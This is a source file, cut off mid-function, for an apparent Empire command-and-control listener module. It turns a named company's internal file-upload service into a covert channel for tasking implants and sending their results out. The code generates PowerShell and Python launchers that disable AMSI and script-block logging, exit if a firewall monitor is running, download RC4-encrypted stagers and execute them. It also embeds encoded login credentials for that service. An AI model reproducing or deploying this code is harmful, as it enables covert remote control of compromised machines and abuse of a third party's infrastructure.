import base64
import random
import os
import re
import time
from datetime import datetime
import copy
import traceback
import sys
import json
from pydispatch import dispatcher
from requests import Request, Session

#Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages
from lib.common import bypasses
from lib.common import templating
from lib.common import obfuscation

class Listener:
    def __init__(self, mainMenu, params=[]):
        self.info = {
                'Name': 'Transfer_template',
                'Author': ['@tyraniter'],
                'Description': ('Transfer listener template'),
                'Category': ('third_party'),
                'Comments': []
                }

        self.options = {
            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'transfer'
            },
            'Username' : {
                'Description'   :   'Username of wizard.',
                'Required'      :   True,
                'Value'         :   'e5vkgPPEkSsyhuOTCy1uALgyIytCECwqtquoPDex7Y5AhAtYsrqSIbuXDefIjKs%2F%2BSIYawWYBfORfeIvWPmC2lHAwu5T7FTvaFWdrYjG4WKdkBRxPufUkC4dEA4DpW4ScXJMipGMQxfvG2ewDPBEHJeXlqbU8hCH%2BpoW5x7dhCU%3D'
            },
            'Password' : {
                'Description'   :   'Password of wizard.',
                'Required'      :   True,
                'Value'         :   'Mm0IZUJJGZfaDKPR5u5VRp5uGQt1HMz4km2EaFXBfHsKnPxyK071yuYUxqyRjo8%2FjhQQggo73wZH2Don0lz%2BptjyG3SccfzEdWbVti%2F99a686DV3EQ9M3B55E42ydLDttOfkIahYdUAmVh7Fc1XG8ZD2cCvK5v1m0UCXcxDrGtg%3D'
            },
            'Signature' : {
                'Description'   :   'Signature of wizard. RSA(Username+Password)',
                'Required'      :   True,
                'Value'         :   'jrND%2FO4Q8eDYU0%2FQUbzRYX5Zvv4QAME3t4uTdfhZVyKOkPkw9wu5HU6BD9%2FRtloqFlIhB%2FdRhkf9jOBPyi%2FogBhAYDUeUTbT7OjYB1rGLIeXZ0rjY1R92gxkl7iEs%2BtxPrVauISXOIRfojkJSPfohFJsrV3q1TxopJXVXLTVUyI%3D'
            },
            'StagingFolder' : {
                'Description'   :   'The nested Wizard staging workspace.',
                'Required'      :   True,
                'Value'         :   'staging'
            },
            'TaskingsFolder' : {
                'Description'   :   'The nested Wizard taskings workspace.',
                'Required'      :   True,
                'Value'         :   'taskings'
            },
            'ResultsFolder' : {
                'Description'   :   'The nested Wizard results workspace.',
                'Required'      :   True,
                'Value'         :   'results'
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'Token' : {
                'Description'   :   'Launcher string.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'StagingKey' : {
                'Description'   :   'Staging key for intial agent negotiation.',
                'Required'      :   True,
                'Value'         :   'asdf'
            },
            'PollInterval' : {
                'Description'   :   'Polling interval (in seconds) to communicate with wizard.',
                'Required'      :   True,
                'Value'         :   '5'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   15
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   10
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "N/A|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackToken' : {
                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'SlackChannel' : {
                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
                'Required'      :   False,
                'Value'         :   '#general'
            }
        }

        self.mainMenu = mainMenu
        self.threads = {}

        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])

    def default_response(self):
        return ''

    def validate_options(self):

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True

    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
        if not language:
            print helpers.color("[!] listeners/wizard generate_launcher(): No language specified")

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
            listener_options = self.mainMenu.listeners.activeListeners[listenerName]['options']
            staging_key = listener_options['StagingKey']['Value']
            profile = listener_options['DefaultProfile']['Value']
            launcher_cmd = listener_options['Launcher']['Value']
            staging_key = listener_options['StagingKey']['Value']
            token = listener_options['Token']

            if language.startswith("power"):
                launcher = "$ErrorActionPreference = 'SilentlyContinue';" #Set as empty string for debugging

                if safeChecks.lower() == 'true':
                    launcher = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                    # ScriptBlock Logging bypass
                    if scriptLogBypass:
                        launcher += bypasses.scriptBlockLogBypass()
                    # @mattifestation's AMSI bypass
                    if AMSIBypass:
                        launcher += bypasses.AMSIBypass()
                    # rastamouse AMSI bypass
                    if AMSIBypass2:
                        launcher += bypasses.AMSIBypass2()
                    launcher += "};"
                    launcher += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                launcher += helpers.randomize_capitalization("$wc=New-Object SYstem.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listener_options['DefaultProfile']['Value']
                    userAgent = profile.split("|")[1]
                launcher += "$u='" + userAgent + "';"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':
                    if userAgent.lower() != 'none':
                        launcher += helpers.randomize_capitalization("$wc.Headers.Add(")
                        launcher += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            launcher += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            launcher += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            launcher += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            launcher += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                    if proxyCreds.lower() == "default":
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        launcher += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                        launcher += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                    launcher += "$Script:Proxy = $wc.Proxy;"

                # code to turn the key string into a byte array
                launcher += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                launcher += ("'%s');" % staging_key)

                # this is the minimized RC4 launcher code from rc4.ps1
                launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                launcher += helpers.randomize_capitalization("$wc.headers.add('")
                launcher += "Cookie','ws_auth=%s" % token
                launcher += helpers.randomize_capitalization("');")

                launcher += helpers.randomize_capitalization("$data=$wc.DownloadString('")
                launcher += self.mainMenu.listeners.activeListeners[listenerName]['ps_stager_url']
                launcher += helpers.randomize_capitalization("');$data=[Convert]::FromBase64String($data);$iv=$data[0..3];$data=$data[4..$data.length];")

                launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    launcher = helpers.obfuscate(self.mainMenu.installPath, launcher, obfuscationCommand=obfuscationCommand)

                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(launcher, launcher_cmd)
                else:
                    return launcher

            if language.startswith("pyth"):
                
                launcherBase = 'import sys;'
                if "https" in self.mainMenu.listeners.activeListeners[listenerName]['ps_stager_url']:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess, base64;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n"
                        launcherBase += "out, err = ps.communicate()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listener_options['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]

                launcherBase += "import urllib2;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';" % self.mainMenu.listeners.activeListeners[listenerName]['py_stager_url']

                launcherBase += "req=urllib2.Request(server);\n"
                # add the RC4 packet to a cookie
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header('Cookie',\"%s=%s\");\n" % ('ws_auth',token)

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.split(':')[0]
                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                #install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"

                # download the stager and extract the IV

                launcherBase += "a=urllib2.urlopen(req).read();\n"
                launcherBase += "a=base64.b64decode(a);\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (staging_key)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

        else:
            print helpers.color("[!] listeners/wizard generate_launcher(): invalid listener name")

    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
        """
        Generate the stager code
        """

        if not language:
            print helpers.color("[!] listeners/wizard generate_stager(): no language specified")
            return None

        staging_key = listenerOptions['StagingKey']['Value']
        #base_folder = listenerOptions['BaseFolder']['Value']
        staging_folder = listenerOptions['StagingFolder']['Value']
        working_hours = listenerOptions['WorkingHours']['Value']
        #profile = listenerOptions['DefaultProfile']['Value']
        poll_interval = listenerOptions['PollInterval']['Value']
        staging_folder_id=str(listenerOptions[staging_folder+'FolderID'])

        if language.lower() == 'powershell':
            f = open("%s/data/agent/stagers/wizard.ps1" % self.mainMenu.installPath)
            stager = f.read()
            f.close()

            stager = stager.replace("REPLACE_STAGING_FOLDER", staging_folder_id)
            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
            stager = stager.replace("REPLACE_TOKEN", token)
            stager = stager.replace("REPLACE_POLLING_INTERVAL", str(poll_interval))

            if working_hours != "":
                stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)

            randomized_stager = ''

            for line in stager.split("\n"):
                line = line.strip()

                if not line.startswith("#"):
                    if "\"" not in line:
                        randomized_stager += helpers.randomize_capitalization(line)
                    else:
                        randomized_stager += line

            if encode:
                return helpers.enc_powershell(randomized_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
            else:
                return randomized_stager

        elif language.lower() == 'python':
            template_path = [
                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template('wizard.py')

            template_options = {
                    'staging_folder': staging_folder_id,
                    'poll_interval': poll_interval,
                    'staging_key': staging_key,
                    'token': token
                    }

            stager = template.render(template_options)
            stager = obfuscation.py_minify(stager)
            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+staging_key, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listener_options, username, password, signature,token, language=None):

        #staging_key = listener_options['StagingKey']['Value']
        #base_folder = listener_options['BaseFolder']['Value']
        taskings_folder = listener_options['TaskingsFolder']['Value']
        results_folder = listener_options['ResultsFolder']['Value']
        taskings_folder_id = str(listener_options[taskings_folder+'FolderID'])
        results_folder_id = str(listener_options[results_folder+'FolderID'])

        if not language:
            print helpers.color("[!] listeners/wizard generate_comms(): No language specified")
            return

        if language.lower() == "powershell":
            #Function to generate a WebClient object with the required headers
            token_manager = """
    $Script:TokenObject = @{token="%s";expires=(Get-Date).addSeconds(3480)};
    $script:GetWebClient = {
        $wc = New-Object System.Net.WebClient
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
        if($Script:Proxy) {
            $wc.Proxy = $Script:Proxy;
        }
        if((Get-Date) -gt $Script:TokenObject.expires) {
            $data = New-Object System.Collections.Specialized.NameValueCollection
            $data.add("name", "%s")
            $data.add("pwd", "%s")
            $data.add("signatrue", "%s")
            $raw = $wc.UploadValues("http://wizard.pingan.com.cn/user-center-web/sso/v2/login.do", $data)
            $response = ConvertFrom-Json -InputObject ([system.text.encoding]::ascii.getstring($raw))
            $Script:TokenObject.token = $response.data.tokenCas
            $Script:TokenObject.expires = (get-date).addSeconds($expires_in - 15)
        }
        $wc.headers.add("User-Agent", $script:UserAgent)
        $wc.Headers.add("Cookie", "ws_auth=$($Script:TokenObject.token)");
        $wc.Headers.Add("Content-Type", " application/x-www-form-urlencoded");
        $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
        $wc
    }
            """ % (token, username, password, signature)
            
            post_message = """
    $script:ResultFileID = $Null;
    $script:ResultFileURL = $Null;
    $script:SendMessage = {
        param($packets)

        if($packets) {
            $encBytes = encrypt-bytes $packets
            $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
        } else {
            $RoutingPacket = ""
        }

        $wc = (& $GetWebClient)
        $resultsFolder = "%s"

        try {
            try {
                $data = $null
                if($script:ResultFileURL){
                    write-host 'download result data';
                    $data = $wc.DownloadString($script:ResultFileURL);
                    $data=[Convert]::FromBase64String($data);
                    write-host "downloaded $data";
                }
            } catch {
                $script:ResultFileID = $Null;
                $script:ResultFileURL = $Null;
            }

            if($data -and $data.length -ne 0) {
                $routingPacket = $data + $routingPacket
            }

            $wc = (& $GetWebClient)
            $RoutingPacket=[uri]::EscapeDataString([Convert]::ToBase64String($RoutingPacket));
            $param="title=$ID&content=$RoutingPacket&fileType=txt&id=$($script:ResultFileID)";
            write-host "upload result data $RoutingPacket";
            $raw = $wc.UploadString("http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=$resultsFolder", $param)
            $d=ConvertFrom-Json -InputObject $raw;
            $script:ResultFileID = $d.id;
            $script:ResultFileURL = $d.url;
            write-host "result file id $($script:ResultFileID)";
            $script:missedChecking = 0
            $script:lastseen = get-date
        }
        catch {
            if($_ -match "Unable to connect") {
                $script:missedCheckins += 1
            }
        }
    }
            """ % (results_folder_id)

            get_message = """
    $script:TaskingFileID = $Null;
    $script:TaskingFileURL = $Null;
    $script:lastseen = Get-Date
    $script:GetTask = {
        try {
            $wc = (& $GetWebClient)

            $TaskingsFolder = "%s"

            #If we haven't sent a message recently...
            if($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date)) {
                (& $SendMessage -packets "")
            }
            $script:MissedCheckins = 0
            if($script:TaskingFileURL){
                write-host 'download task data';
                $data = $wc.DownloadString($script:TaskingFileURL);
                $data = [Convert]::FromBase64String($data);
                write-host "downloaded $data";
            }else{
                $param="title=$ID&content=&fileType=txt&id=$($script:TaskingFileID)";
                write-host 'create task file';
                $raw = $wc.UploadString("http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=$TaskingsFolder",$param);
                $d=ConvertFrom-Json -InputObject $raw;
                $script:TaskingFileID = $d.id;
                $script:TaskingFileURL = $d.url;
                write-host "new task file id $($script:TaskingFileID)";
            }
            
            if($data -and ($data.length -ne 0)) {
                $wc = (& $GetWebClient)
                $param="title=$ID&content=&fileType=txt&id=$($script:TaskingFileID)";
                write-host 'clear task data';
                $raw = $wc.UploadString("http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=$TaskingsFolder",$param);
                write-host 'cleared';
                if([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {
                    Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA
                }
                $Data
            }
        }
        catch {
            if($_ -match "Unable to connect") {
                $script:MissedCheckins += 1
            }
        }
    }
            """ % (taskings_folder_id)

            return token_manager + post_message + get_message
        elif language.lower() == 'python':

                sendMessage = """
resultsFileID=''
resultsFileURL=''
taskingFileID=''
taskingFileURL=''

def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    def post_message(uri, data, headers):
        req = urllib2.Request(uri)
        for key, value in headers.iteritems():
            req.add_header("%s"%(key),"%s"%(value))

        if data:
            req.add_data(data)

        o=urllib2.build_opener()
        o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))
        urllib2.install_opener(o)

        return urllib2.urlopen(req).read()

    global missedCheckins
    global headers
    taskingsFolder="REPLACE_TASKSING_FOLDER"
    resultsFolder="REPLACE_RESULTS_FOLDER"
    global resultsFileID
    global resultsFileURL
    global taskingFileID
    global taskingFileURL
    data = None
    requestUri=''
    try:
        del headers['Content-Type']
    except:
        pass
    
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
        #check to see if there are any results already present

        headers['User-Agent'] = userAgent
        headers['Content-Type'] = "application/x-www-form-urlencoded"
        headers['Cookie'] = "ws_auth=%s" % "REPLACE_TOKEN"

        try:
            pkdata = None
            if resultsFileURL != '':
                pkdata = post_message(resultsFileURL, data=None, headers=headers)
                pkdata=base64.b64decode(pkdata)
        except:
            pkdata = None
        
        if pkdata and len(pkdata) > 0:
            data = pkdata + data
        data = "title=%s&content=%s&fileType=txt&id=%s" % (sessionID,urllib.quote(base64.b64encode(data)),resultsFileID)
        
        requestUri = 'http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=%s' % resultsFolder
    else:
        headers['User-Agent'] = userAgent
        headers['Content-Type'] = "application/x-www-form-urlencoded"
        headers['Cookie'] = "ws_auth=%s" % "REPLACE_TOKEN"

        try:
            if taskingFileURL == '':
                data = "title=%s&content=&fileType=txt" % (sessionID)
                resp = post_message('http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=%s' % taskingsFolder, data=data, headers=headers)
                resp = json.loads(resp)
                taskingFileID = resp['id']
                taskingFileURL = resp['url']  
        except:
            data =''
        data = None
        requestUri = taskingFileURL

    try:
        resultdata = post_message(requestUri, data, headers)
        if (resultdata and len(resultdata) > 0) and data is None:
            data = "title=%s&content=&fileType=txt&id=%s" % (sessionID,taskingFileID)
            resp = post_message('http://wizard.pingan.com.cn/alm/file?uploadMarkdown&projectId=%s' % taskingsFolder, data=data, headers=headers)
        return ('200', base64.b64decode(resultdata))

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                
                sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskings_folder_id)
                sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', results_folder_id)
                sendMessage = sendMessage.replace('REPLACE_TOKEN', token)
                return sendMessage
        else:
            print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')

    def generate_agent(self, listener_options, client_id, client_secret, token, refresh_token, language=None):
        """
        Generate the agent code
        """

        if not language:
            print helpers.color("[!] listeners/wizard generate_agent(): No language specified")
            return

        language = language.lower()
        delay = listener_options['DefaultDelay']['Value']
        jitter = listener_options['DefaultJitter']['Value']
        profile = listener_options['DefaultProfile']['Value']
        lost_limit = listener_options['DefaultLostLimit']['Value']
        #working_hours = listener_options['WorkingHours']['Value']
        kill_date = listener_options['KillDate']['Value']
        username = listener_options['Username']['Value']
        password = listener_options['Password']['Value']
        signature = listener_options['Signature']['Value']
        b64_default_response = base64.b64encode(self.default_response())

        if language == 'powershell':
            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
            agent_code = f.read()
            f.close()

            comms_code = self.generate_comms(listener_options, username, password, signature, token, language)
            agent_code = agent_code.replace("REPLACE_COMMS", comms_code)

            agent_code = helpers.strip_powershell_comments(agent_code)

            agent_code = agent_code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            agent_code = agent_code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            agent_code = agent_code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            agent_code = agent_code.replace('$LostLimit = 60', "$LostLimit = " + str(lost_limit))
            agent_code = agent_code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64_default_response+'"')

            if kill_date != "":
                agent_code = agent_code.replace("$KillDate,", "$KillDate = '" + str(kill_date) + "',")

            return agent_code
        
        elif language == 'python':
            f = open(self.mainMenu.installPath + "/data/agent/agent.py")
            code = f.read()
            f.close()

            #path in the comms methods
            comms_code = self.generate_comms(listener_options, username, password, signature, token, language)
            code = code.replace('REPLACE_COMMS', comms_code)

            #strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            #patch some more
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lost_limit))
            code = code.replace('defaultResponse = ""', 'defaultResponse = "%s"' % (b64_default_response))

            # patch in the killDate and workingHours if they're specified
            if kill_date != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (kill_date))

            return code
        else:
            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")


    def start_server(self, listenerOptions):

        # Utility functions to handle auth tasks and initial setup         
        def get_token(name, pwd, signature):
            data = {'name': name,#rsa(name)
                      'pwd': pwd,#rsa(pwd)
                      'signatrue': signature,#rsa(name+pwd)
                      }
            try:
                r = s.post('%s/user-center-web/sso/v2/login.do' % (base_url), data=data,proxies = proxies)
                r_token = r.json()['data']
                return r_token
            except KeyError, e:
                print helpers.color("[!] Something went wrong, HTTP response %d, error code %s: %s" % (r.status_code, r.json()['status'], r.json()['msg']))
                raise

        def test_token(token):
            cookies = s.cookies
            cookies.set('ws_auth',token)

            request = s.get('%s/alm/menu?name=workbench' % base_url, allow_redirects=False,proxies = proxies)
            
            return request.status_code == 200

        def setup_folders():
            if not (test_token(token['tokenCas'])):
                raise ValueError("Could not set up folders, access token invalid")

            base_object = s.get("%s/alm/project/?myProjects&classify=created&current=1" % base_url,proxies = proxies)

            for item in base_object.json()['rows']:
                workspaces[item['name']]=item['id']
                listener_options[item['name']+'FolderID']=item['id']
                #print workspaces

            for item in [staging_folder, taskings_folder, results_folder]:
                if not workspaces.get(item):
                    print helpers.color("[*] Creating %s workspace" % (item))
                    data = {'name': item, 'abbrName': item, 'templateProjectId': -10}
                    item_object = s.post("%s/alm/project/?new" % base_url, data=data,proxies = proxies)
                    workspaces[item]=item_object.content
                    listener_options[item+'FolderID']=item_object.content
                else:
                    message = "[*] {} already exists".format(item)
                    signal = json.dumps({
                        'print' : True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
            #print listener_options
        
        def check_staging_files():
            search = s.get("%s/alm/file/api_p2/?list&projectId=%s" % (base_url, workspaces[staging_folder]),proxies = proxies)
            for item in search.json()['rows']:
                staging_files[item['name']]=item['id']
            #print staging_files

        def check_tasking_files():
            search = s.get("%s/alm/file/api_p2/?list&projectId=%s" % (base_url, workspaces[taskings_folder]),proxies = proxies)
            for item in search.json()['rows']:
                tasking_files[item['name'].split('.')[0]]=item    

        def check_result_files():
            search = s.get("%s/alm/file/api_p2/?list&projectId=%s" % (base_url, workspaces[results_folder]),proxies = proxies)
            result_files.clear()
            for item in search.json()['rows']:
                result_files[item['name'].split('.')[0]]=item
            #print result_files

        def upload_launcher():
            #print token['tokenCas']
            ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='default', proxyCreds='default')

            '''files={
                'fileName':('blob',ps_launcher,'image/png'),
            }
            r = s.post("%s/user-center-web/profile/upload" % base_url, files=files, proxies = proxies)
            print r.json()'''
            
            data={
                'title':'LAUNCHER-PS',
                'content':ps_launcher,
                'fileType':'txt',
                'id': staging_files.get('LAUNCHER-PS.txt',''),
            }
            r = s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)
            if r.status_code == 200:
                ps_launcher_url = r.json()['url']
            
            py_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='python', encode=False, userAgent='none', proxy='none', proxyCreds='none')
            
            data={
                'title':'LAUNCHER-PY',
                'content':py_launcher,
                'fileType':'txt',
                'id': staging_files.get('LAUNCHER-PY.txt',''),
            }
            r = s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)
            if r.status_code == 200:
                py_launcher_url = r.json()['url']

        def upload_stager():
            #powershell stager
            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell', token=token['tokenCas'])
            #need base64
            ps_stager=base64.b64encode(ps_stager)
            #print ps_stager
            '''files={
                'fileName':('STAGE0-PS-1.TXT',ps_stager,'application/octet-stream'),
                'projectId':(None,workspaces[staging_folder],None),
            }
            r = s.post("%s/alm/file?upload" % base_url, files=files)'''

            data={
                'title':'STAGE0-PS',
                'content':ps_stager,
                'fileType':'txt',
                'id': staging_files.get('STAGE0-PS.txt',''),
            }
            r = s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)

            if r.status_code == 200:
                ps_stager_url = r.json()['url']
                #Different domain for some reason?
                self.mainMenu.listeners.activeListeners[listener_name]['ps_stager_url'] = ps_stager_url

            else:
                print helpers.color("[!] Something went wrong uploading stager")
                message = r.content
                signal = json.dumps({
                    'print' : True,
                    'message': message
                })
                dispatcher.send(signal, sender="listeners/wizard/{}".format(listener_name))
            
            #powershell stager
            py_stager = self.generate_stager(listenerOptions=listener_options, language='python', token=token['tokenCas'])
            #need base64
            py_stager=base64.b64encode(py_stager)
            #print ps_stager
            data={
                'title':'STAGE0-PY',
                'content':py_stager,
                'fileType':'txt',
                'id': staging_files.get('STAGE0-PY.txt',''),
            }
            r = s.post("%s/alm/file?uploadMarkdown&projectId=%s" % (base_url,workspaces[staging_folder]), data=data,proxies = proxies)

            if r.status_code == 200:
                py_stager_url = r.json()['url']
                #Different domain for some reason?
                self.mainMenu.listeners.activeListeners[listener_name]['py_stager_url'] = py_stager_url

            else:
                print helpers.color("[!] Something went wrong uploading stager")
                message = r.content
